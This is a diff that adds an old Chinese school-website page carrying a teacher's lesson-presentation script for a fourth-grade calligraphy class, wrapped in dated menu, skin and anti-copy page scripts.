@@ -1,0 +1,673 @@
+
+<html>
+<head>
+<title>四年级写字课&nbsp;说课稿</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+
+<style type="text/css">
+A{TEXT-DECORATION: none;}
+A:hover{COLOR: #FF00FF;}
+A:link {color: #205064;}
+A:visited {color: #205064;}
+BODY
+{
+background:url(Skin/2/bg01.gif);background-position: center;
+FONT-FAMILY: 宋体;FONT-SIZE: 9pt;
+color: #000000;
+text-decoration: none;
+SCROLLBAR-FACE-COLOR: #f7fef6;
+SCROLLBAR-HIGHLIGHT-COLOR: #B4C4D4; SCROLLBAR-SHADOW-COLOR: #B4C4D4; SCROLLBAR-3DLIGHT-COLOR: #f7fef6; SCROLLBAR-ARROW-COLOR: #ff0000; SCROLLBAR-TRACK-COLOR: #f7fef6; SCROLLBAR-DARKSHADOW-COLOR: #cdcbe2;
+}
+TD
+{
+FONT-FAMILY: 宋体; FONT-SIZE: 9pt;
+color: #003366;
+line-height: 150%; 
+
+}
+Input
+{
+BACKGROUND-COLOR: #DFE6EE; 
+BORDER-BOTTOM: #89a5e6 1px solid;
+BORDER-LEFT: #89a5e6 1px solid;
+BORDER-RIGHT: #89a5e6 1px solid;
+BORDER-TOP: #89a5e6 1px solid;
+COLOR: #205064;
+HEIGHT: 18px;
+border-color: #B2C2D7 #B2C2D7 #B2C2D7 #B2C2D7; font-size: 9pt
+}
+Button
+{
+FONT-SIZE: 9pt;HEIGHT: 20px; 
+
+}
+Select
+{
+FONT-SIZE: 9pt;HEIGHT: 20px;
+
+}
+.border
+{
+border:#ffffff 1px solid ;background:#EDF1F6;
+
+}
+.border2
+{
+background:#DFE6EE;
+BORDER-bottom: #B2C2D7 1px solid;
+}
+.title_txt
+{
+background:#000000;
+}
+.title
+{
+background:url(Skin/2/title_left.gif);height: 22;
+
+}
+.tdbg
+{
+background:#DFE6EE;
+}
+.txt_css
+{
+background:url(Skin/2/txt_css.gif);height: 36;
+}
+.title_lefttxt
+{
+color: #333333; filter: DropShadow(Color=#ffffff, OffX=1, OffY=1, Positive=1)
+}
+.title_left
+{
+background:url(Skin/2/title_left.gif);height: 22;
+}
+.tdbg_left
+{
+background:#DFE6EE;
+}
+.title_left2
+{
+background:#DFE6EE;
+}
+.tdbg_left2
+{
+
+}
+.tdbg_leftall
+{
+background:#DFE6EE;
+BORDER-right: #B2C2D7 1px solid;
+
+}
+.title_maintxt
+{
+color: #000000; filter: DropShadow(Color=#ffffff, OffX=1, OffY=1, Positive=1)
+}
+.title_main
+{
+background:url(Skin/2/title_main.gif);height: 22;
+}
+.tdbg_main
+{
+background:url(Skin/2/tdbg_main2.GIF);line-height: 100%;
+}
+.title_main2
+{
+background:#B2C2D7;background:url(Skin/2/maintop.gif);height: 202;
+}
+.tdbg_main2
+{
+background:url(Skin/2/tdbg_main3.GIF);height: 27;
+}
+.tdbg_mainall
+{
+background:url(Skin/2/kt01-p1.GIF);
+}
+.title_righttxt
+{
+color: #333333; filter: DropShadow(Color=#ffffff, OffX=1, OffY=1, Positive=1)
+}
+.title_right
+{
+background:url(Skin/2/title_left.gif);height: 22;
+}
+.tdbg_right
+{
+background:#ffffff;
+
+}
+.title_right2
+{
+background:url(Skin/2/title_main1.gif);height: 22;
+}
+.tdbg_right2
+{
+background:url(Skin/2/title_main2.gif);height: 22;
+}
+.tdbg_rightall
+{
+background:#B4C4D4;
+}
+.topborder
+{
+background-image: url(Skin/2/topborder.gif);
+}
+.nav_top
+{
+background-image: url(Skin/2/nav_top.gif);height:25;
+
+}
+.nav_main
+{
+
+}
+.nav_bottom
+{
+background-image: url(Skin/2/bottombg_2.gif);
+
+}
+.nav_menu
+{
+background:url(Skin/2/nav_menu.gif);height: 24;
+}
+.menu
+{
+background-color: #B2C2D7;
+width:90%;border: 1px; 
+
+}
+td.MenuBody
+{
+background-color: #F6F6F6;
+}
+</style>
+
+<SCRIPT src="fud.js"></SCRIPT>
+<script language="JavaScript" type="text/JavaScript">
+//下拉菜单相关代码
+ var h;
+ var w;
+ var l;
+ var t;
+ var topMar = 1;
+ var leftMar = -2;
+ var space = 1;
+ var isvisible;
+ var MENU_SHADOW_COLOR='#999999';//定义下拉菜单阴影色
+ var global = window.document
+ global.fo_currentMenu = null
+ global.fo_shadows = new Array
+
+function HideMenu() 
+{
+ var mX;
+ var mY;
+ var vDiv;
+ var mDiv;
+	if (isvisible == true)
+{
+		vDiv = document.all("menuDiv");
+		mX = window.event.clientX + document.body.scrollLeft;
+		mY = window.event.clientY + document.body.scrollTop;
+		if ((mX < parseInt(vDiv.style.left)) || (mX > parseInt(vDiv.style.left)+vDiv.offsetWidth) || (mY < parseInt(vDiv.style.top)-h) || (mY > parseInt(vDiv.style.top)+vDiv.offsetHeight)){
+			vDiv.style.visibility = "hidden";
+			isvisible = false;
+		}
+}
+}
+
+function ShowMenu(vMnuCode,tWidth) {
+	vSrc = window.event.srcElement;
+	vMnuCode = "<table id='submenu' cellspacing=1 cellpadding=3 style='width:"+tWidth+"' class=menu onmouseout='HideMenu()'><tr height=23><td nowrap align=left class=MenuBody>" + vMnuCode + "</td></tr></table>";
+
+	h = vSrc.offsetHeight;
+	w = vSrc.offsetWidth;
+	l = vSrc.offsetLeft + leftMar+4;
+	t = vSrc.offsetTop + topMar + h + space-2;
+	vParent = vSrc.offsetParent;
+	while (vParent.tagName.toUpperCase() != "BODY")
+	{
+		l += vParent.offsetLeft;
+		t += vParent.offsetTop;
+		vParent = vParent.offsetParent;
+	}
+
+	menuDiv.innerHTML = vMnuCode;
+	menuDiv.style.top = t;
+	menuDiv.style.left = l;
+	menuDiv.style.visibility = "visible";
+	isvisible = true;
+    makeRectangularDropShadow(submenu, MENU_SHADOW_COLOR, 4)
+}
+
+function makeRectangularDropShadow(el, color, size)
+{
+	var i;
+	for (i=size; i>0; i--)
+	{
+		var rect = document.createElement('div');
+		var rs = rect.style
+		rs.position = 'absolute';
+		rs.left = (el.style.posLeft + i) + 'px';
+		rs.top = (el.style.posTop + i) + 'px';
+		rs.width = el.offsetWidth + 'px';
+		rs.height = el.offsetHeight + 'px';
+		rs.zIndex = el.style.zIndex - i;
+		rs.backgroundColor = color;
+		var opacity = 1 - i / (i + 1);
+		rs.filter = 'alpha(opacity=' + (100 * opacity) + ')';
+		el.insertAdjacentElement('afterEnd', rect);
+		global.fo_shadows[global.fo_shadows.length] = rect;
+	}
+}
+</script>
+<script language='JavaScript' type='text/JavaScript'>
+//菜单列表
+var menu_skin="&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=1'>牧虫典雅</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=2'>雅虎秋梦</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=3'>灰色畅想</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=4'>绿雨飘香</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=5'>幽绿芭蕾</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=6'>晴空幽蓝</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=7'>书卷飘香</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=8'>蓝色梦想</a><br>&nbsp;<a style=font-size:9pt;line-height:14pt; href='SetCookie.asp?Action=SetSkin&ClassID=15&SkinID=9'>雪映红梅</a><br>";
+</script>
+<script type='text/javascript' language='JavaScript1.2' src='stm31.js'></script>
+<script language="JavaScript" type="text/JavaScript">
+//双击鼠标滚动屏幕的代码
+var currentpos,timer;
+function initialize()
+{
+timer=setInterval ("scrollwindow ()",30);
+}
+function sc()
+{
+clearInterval(timer);
+}
+function scrollwindow()
+{
+currentpos=document.body.scrollTop;
+window.scroll(0,++currentpos);
+if (currentpos !=document.body.scrollTop)
+sc();
+}
+document.onmousedown=sc
+document.ondblclick=initialize
+</script>
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+</head>
+<body leftmargin=0 topmargin=0 onmousemove='HideMenu()' oncontextmenu="return false" ondragstart="return false" onselectstart ="return false" onselect="document.selection.empty()" oncopy="document.selection.empty()" onbeforecopy="return false" onmouseup="document.selection.empty()">
+<noscript><iframe src=*></iframe></noscript>
+<div id=menuDiv style='Z-INDEX: 1000; VISIBILITY: hidden; WIDTH: 1px; POSITION: absolute; HEIGHT: 1px; BACKGROUND-COLOR: #9cc5f8'></div>
+<table width="760" border="0" align="center" cellpadding="0" cellspacing="0" class="tdbg">
+  <tr> 
+    <td> <table width="100%" align="center" cellpadding="0" cellspacing="0">
+        <tr>
+          <td height="4"></td>
+        </tr>
+        <tr> 
+          <td valign="middle"> <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+              <tr valign="middle"> 
+                <td width="179"> 
+                  <a href='/gzwl' title='高中物理首页'><img src='images/logo.gif' width='180' height='60' border='0'></a>
+                </td>
+                <td width="489"> <div align="center"> 
+                    <a href='/gzwl' title='高中物理首页'><img src='Images/banner.jpg' width='480' height='60' border='0'></a>
+                  </div></td>
+                <td width="90"> 
+                  ·<a href='../Index.asp'><font color=''>宝坻首页</font></a>&nbsp;<br>·<a href='http://bd.tjjy.com.cn/bbs' >教学论坛</a><br>·<a href='guestbook.asp' >留言</a><br>
+                </td>
+              </tr>
+            </table></td>
+        </tr>
+      </table></td>
+  </tr>
+  <tr valign="middle"> 
+    <td valign="middle" class="nav_menu"> 
+      <script type='text/javascript' language='JavaScript1.2'>
+<!--
+stm_bm(['uueoehr',400,'','images/blank.gif',0,'','',0,0,0,0,0,1,0,0]);
+stm_bp('p0',[0,4,0,0,2,2,0,0,100,'',-2,'',-2,90,0,0,'#000000','transparent','',3,0,0,'#000000']);
+stm_ai('p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i1','p0i0',[0,'宝坻首页','','',-1,-1,0,'../Index.asp','_self','../Index.asp','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i3','p0i0',[0,'论文交流','','',-1,-1,0,'Article_Class2.asp?ClassID=1','_self','Article_Class2.asp?ClassID=1','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i4','p0i0',[0,'考试题库','','',-1,-1,0,'Article_Class2.asp?ClassID=2','_self','Article_Class2.asp?ClassID=2','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_bp('p1',[1,4,0,0,2,3,6,7,100,'progid:DXImageTransform.Microsoft.Fade(overlap=.5,enabled=0,Duration=0.43)',-2,'',-2,67,2,3,'#999999','#ffffff','',3,1,1,'#aca899']);
+stm_aix('p1i0','p0i0',[0,'一年级试题题库','','',-1,-1,0,'Article_Class2.asp?ClassID=9','_self','Article_Class2.asp?ClassID=9','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',0,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体']);
+stm_aix('p1i1','p0i0',[0,'二年级试题题库','','',-1,-1,0,'Article_Class2.asp?ClassID=10','_self','Article_Class2.asp?ClassID=10','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',0,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体']);
+stm_aix('p1i2','p0i0',[0,'三年级试题题库','','',-1,-1,0,'Article_Class2.asp?ClassID=11','_self','Article_Class2.asp?ClassID=11','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',0,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体']);
+stm_aix('p1i3','p0i0',[0,'四年级试题题库','','',-1,-1,0,'Article_Class2.asp?ClassID=12','_self','Article_Class2.asp?ClassID=12','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',0,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体']);
+stm_aix('p1i4','p0i0',[0,'五年级试题题库','','',-1,-1,0,'Article_Class2.asp?ClassID=13','_self','Article_Class2.asp?ClassID=13','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',0,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体']);
+stm_aix('p1i5','p0i0',[0,'综合题库','','',-1,-1,0,'Article_Class2.asp?ClassID=14','_self','Article_Class2.asp?ClassID=14','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',0,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体']);
+stm_ep();
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i5','p0i0',[0,'备课通道','','',-1,-1,0,'Article_Class2.asp?ClassID=3','_self','Article_Class2.asp?ClassID=3','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i6','p0i0',[0,'方法引路','','',-1,-1,0,'Article_Class2.asp?ClassID=4','_self','Article_Class2.asp?ClassID=4','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i7','p0i0',[0,'课外阅读','','',-1,-1,0,'Article_Class2.asp?ClassID=5','_self','Article_Class2.asp?ClassID=5','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i8','p0i0',[0,'翩翩思绪','','',-1,-1,0,'Article_Class2.asp?ClassID=6','_self','Article_Class2.asp?ClassID=6','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i9','p0i0',[0,'课题研究','','',-1,-1,0,'Article_Class2.asp?ClassID=15','_self','Article_Class2.asp?ClassID=15','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_aix('p0i10','p0i0',[0,'以读为本，“读”占鳌头','','',-1,-1,0,'Article_Class2.asp?ClassID=16','_self','Article_Class2.asp?ClassID=16','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#ff0000','#000000','#cc0000','9pt 宋体','9pt 宋体']);
+stm_aix('p0i2','p0i0',[0,'|','','',-1,-1,0,'','_self','','','','',0,0,0,'','',0,0,0,0,1,'#f1f2ee',1,'#cccccc',1,'','',3,3,0,0,'#fffff7','#000000','#000000','#000000','9pt 宋体','9pt 宋体',0,0]);
+stm_em();
+//-->
+</script>
+
+    </td>
+  </tr>
+  <tr Class="nav_main"> 
+    <td></td>
+  </tr>
+  <tr> 
+    <td class="nav_bottom"></td>
+  </tr>
+</table>
+<table width="760" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" class="txt_css">
+  <tr valign="middle"> 
+    <td width=46><div align="right"><img src="Images/arrow3.gif" width="29" height="11" align="absmiddle"> 
+      </div></td>
+    <td width=556>
+      &nbsp;您现在的位置：&nbsp;<a href='/gzwl'>高中物理首页</a>&nbsp;&gt;&gt;&nbsp;<a href='Article_Class2.asp?ClassID=15'>课题研究</a>&nbsp;&gt;&gt;&nbsp;正文
+    </td>
+    <td width=158 align=right>
+<script language="JavaScript" type="text/JavaScript">
+var day="";
+var month="";
+var ampm="";
+var ampmhour="";
+var myweekday="";
+var year="";
+mydate=new Date();
+myweekday=mydate.getDay();
+mymonth=mydate.getMonth()+1;
+myday= mydate.getDate();
+myyear= mydate.getYear();
+year=(myyear > 200) ? myyear : 1900 + myyear;
+if(myweekday == 0)
+weekday=" 星期日 ";
+else if(myweekday == 1)
+weekday=" 星期一 ";
+else if(myweekday == 2)
+weekday=" 星期二 ";
+else if(myweekday == 3)
+weekday=" 星期三 ";
+else if(myweekday == 4)
+weekday=" 星期四 ";
+else if(myweekday == 5)
+weekday=" 星期五 ";
+else if(myweekday == 6)
+weekday=" 星期六 ";
+document.write(year+"年"+mymonth+"月"+myday+"日 "+weekday);
+</script>&nbsp;</td>
+  </tr>
+</table>
+
+<table width="760" border="0" align="center" cellpadding="0" cellspacing="0" class="border2">
+  <tr> 
+    <td valign="top"><table width="100%" border="0" align="center" cellpadding="2" cellspacing="0" class="border">
+        <tr> 
+          <td class="title"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="82%" valign="middle" class="title_maintxt">&nbsp;<img src="Images/arrow.gif" width="11" height="14" align="absmiddle"> 
+                  四年级写字课&nbsp;说课稿
+                </td>
+                <td width="18%" class="title_maintxt"> 
+                  &nbsp;&nbsp;&nbsp;<font color=red>热</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color='#009900'></font>
+                </td>
+              </tr>
+            </table> </td>
+        </tr>
+         <tr align="center" valign="middle"> 
+          <td height="48" colspan="2" valign="middle"> 
+            <p><font size="4" face="黑体">四年级写字课&nbsp;说课稿</font></p>
+             </td>
+         </tr>
+
+        <tr align="center" class="tdbg_rightall"> 
+          <td colspan="2">［ 
+            作者：宝坻区建设路小学&nbsp;&nbsp;韩振东&nbsp;&nbsp;&nbsp;&nbsp;转贴自：本站原创&nbsp;&nbsp;&nbsp;&nbsp;点击数：1302&nbsp;&nbsp;&nbsp;&nbsp;更新时间：2007-1-5&nbsp;&nbsp;&nbsp;&nbsp;文章录入：admin
+            ］</td>
+        </tr>
+        <tr> 
+          <td colspan="2"><table width="740" border="0" align="center" cellpadding="0" cellspacing="5" style="word-break:break-all;Width:fixed">
+              <tr> 
+                <td height="200" valign="top"> <table border="0" align="left" cellpadding="10" cellspacing="0">
+                    <tr>
+                      <td></td>
+                    </tr>
+                  </table>
+                  <P class=MsoNormal style="MARGIN: 0cm 0cm 0pt; TEXT-INDENT: 160pt; mso-char-indent-count: 10.0; mso-char-indent-size: 16.0pt"><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 12.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">写字课</SPAN><SPAN style="FONT-SIZE: 16pt; mso-bidi-font-size: 12.0pt"><FONT face="Times New Roman"> </FONT></SPAN><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 12.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">说课稿</SPAN><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 12.0pt"><?xml:namespace prefix = o ns = "urn:schemas-microsoft-com:office:office" /><o:p></o:p></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt; TEXT-INDENT: 30.7pt; LINE-HEIGHT: 160%; TEXT-ALIGN: left; mso-char-indent-count: 1.92; mso-char-indent-size: 15.95pt" align=left><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">写字教学是语文教学这个系统中的一个重要部分，也是识字教学这个系统中的一个部分。它是巩固识字教学的手段，使学生加深对所学字的理解和记忆；</SPAN></SPAN><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312; mso-bidi-font-size: 14.0pt">也是对促进学生身心健康有直接功能，对学生意志的磨练、情操的陶冶、良好习惯的形成、想象力和创造力的开发都会产生潜移默化的作用。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt; TEXT-INDENT: 30.7pt; LINE-HEIGHT: 160%; TEXT-ALIGN: left; mso-char-indent-count: 1.92; mso-char-indent-size: 15.95pt" align=left><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312; mso-bidi-font-size: 14.0pt">新课标要求，要培植学生热爱祖国语言文字的情感，对各学段的写字教学提出了不同的要求，落实好新课标，开展好写字教学是非常必要的。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 0cm; TEXT-INDENT: 56pt; LINE-HEIGHT: 160%; TEXT-ALIGN: left; mso-char-indent-count: 3.5; mso-char-indent-size: 16.0pt" align=left><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312; mso-bidi-font-size: 14.0pt">我讲的《点落竖中线》是四年级上册的其中一课。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 80.3pt; TEXT-INDENT: -80.3pt; LINE-HEIGHT: 15pt; mso-line-height-rule: exactly; mso-char-indent-count: -5.0; mso-char-indent-size: 16.05pt"><B style="mso-bidi-font-weight: normal"><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">教学目标</SPAN></B><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">：<SPAN lang=EN-US>1、使学生掌握首笔点在竖中线上的字的特点，结构规律及写法，把字写匀称、端正、优美。<o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 0cm; TEXT-INDENT: 80pt; LINE-HEIGHT: 15pt; mso-line-height-rule: exactly; mso-char-indent-count: 5.0; mso-char-indent-size: 16.0pt"><SPAN lang=EN-US style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">2<B style="mso-bidi-font-weight: normal">、</B>培养学生良好的书写习惯。<B style="mso-bidi-font-weight: normal"><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><o:p></o:p></B></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 0cm; TEXT-INDENT: 80pt; LINE-HEIGHT: 15pt; mso-line-height-rule: exactly; mso-char-indent-count: 5.0; mso-char-indent-size: 16.0pt"><SPAN lang=EN-US style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">3、培养学生对祖国语言文字的热爱。<o:p></o:p></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 0cm; LINE-HEIGHT: 15pt; mso-line-height-rule: exactly"><B style="mso-bidi-font-weight: normal"><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">教学重点</SPAN></B><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">：掌握字形特点及书写规律。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 32.15pt; TEXT-INDENT: -32.15pt; LINE-HEIGHT: 15pt; mso-line-height-rule: exactly; mso-char-indent-count: -2.0; mso-char-indent-size: 16.05pt"><B style="mso-bidi-font-weight: normal"><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">教学难点</SPAN></B><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312">：能用规律指导书写。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 22.5pt 0pt 0cm; LINE-HEIGHT: 160%; TEXT-ALIGN: left" align=left><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312; mso-bidi-font-size: 14.0pt">我设计四个程序。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt 22.5pt; TEXT-INDENT: -18pt; mso-list: l0 level1 lfo1; tab-stops: list 22.5pt"><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">(一)<SPAN style="FONT: 7pt 'Times New Roman'">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">故事激趣，导入课题。</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt 4.5pt"><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">“<SPAN class=text-normal1><SPAN style="mso-ansi-font-size: 16.0pt">兴趣是最好的老师。</SPAN></SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">”</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">在写字教学中，尤其是在写字课起始阶段要十分重视兴趣的激发。我通过播放书法名家故事来激发学生的写字兴趣，使学生对书法名家产生景仰之情，激起学生“想写好字的愿望。</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
